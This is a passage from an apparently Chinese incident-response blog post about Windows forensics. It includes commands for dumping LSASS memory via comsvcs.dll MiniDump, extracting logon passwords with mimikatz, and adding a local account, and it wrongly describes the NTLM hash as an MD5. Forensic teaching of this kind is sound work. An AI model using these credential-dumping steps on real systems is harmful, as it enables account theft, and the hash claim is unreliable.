<p>wmic process get name,executablepath,processid | findstr 2856 #寻找文件绝对路径</p>
</li>
</ol>
</blockquote>
<ul>
<li>找到可疑exe文件丢给沙箱分析，看网络行为特征</li>
</ul>
<h1 id="关键文件"><a href="#关键文件" class="headerlink" title="关键文件"></a>关键文件</h1><ul>
<li><p>用户权限高</p>
<p><code>administrator</code></p>
</li>
<li><p>访问权限和操作特定</p>
<p><code>AccessMask 0x20000</code> 和 <code>AccessList %%1538</code> 这些值指示了具体的访问权限</p>
</li>
<li><p>路径</p>
<p><code>C:\Windows\System32\SMI\Store\Machine\SCHEMA.DAT</code></p>
</li>
</ul>
<h1 id="查找-更改windows用户密码"><a href="#查找-更改windows用户密码" class="headerlink" title="查找&#x2F;更改windows用户密码"></a>查找&#x2F;更改windows用户密码</h1><p><code>rundll32.exe comsvcs.dll, MiniDump &lt;PID&gt; &lt;DUMP_FILE_PATH&gt; full</code></p>
<p>此命令使用rundll32.exe来调用comsvce.dll中的minidump函数,生成了一个包含系统账户和密码信息的lsass.dmp文件</p>
<ul>
<li>获取dmp文件</li>
</ul>
<blockquote>
<p>文件头:4D 44 4D 50 93 A7</p>
<p>大小:几百KB到几MB</p>
<p>关键词搜索:password</p>
</blockquote>
<ul>
<li>使用minikatz来读取密码</li>
</ul>
<blockquote>
<p>sekurlas::minidump 1.dmp<br>sekurlsa::logonpasswords</p>
</blockquote>
<p><img src="/../images/fe2e239e-29b8-4ab5-9479-8c44b867dc3f.png" alt="fe2e239e-29b8-4ab5-9479-8c44b867dc3f"></p>
<p>ntml即为用户密码的md5,丢去解密即可</p>
<p><code>net user admin Password1 /add</code></p>
<p>此命令用来添加windows账户,权限为普通用户,用户名为admin,密码为Password1</p>
<h1 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h1><ul>
<li><p><code>./</code>隐藏,设置打开查看隐藏文件即可</p>
</li>
<li><p>修改文件属性</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a</span><br><span class="line"><span class="built_in">attrib</span> -s -h <span class="number">7</span>z.exe</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>windows</tag>
        <tag>日志分析</tag>
      </tags>
  </entry>
</search>
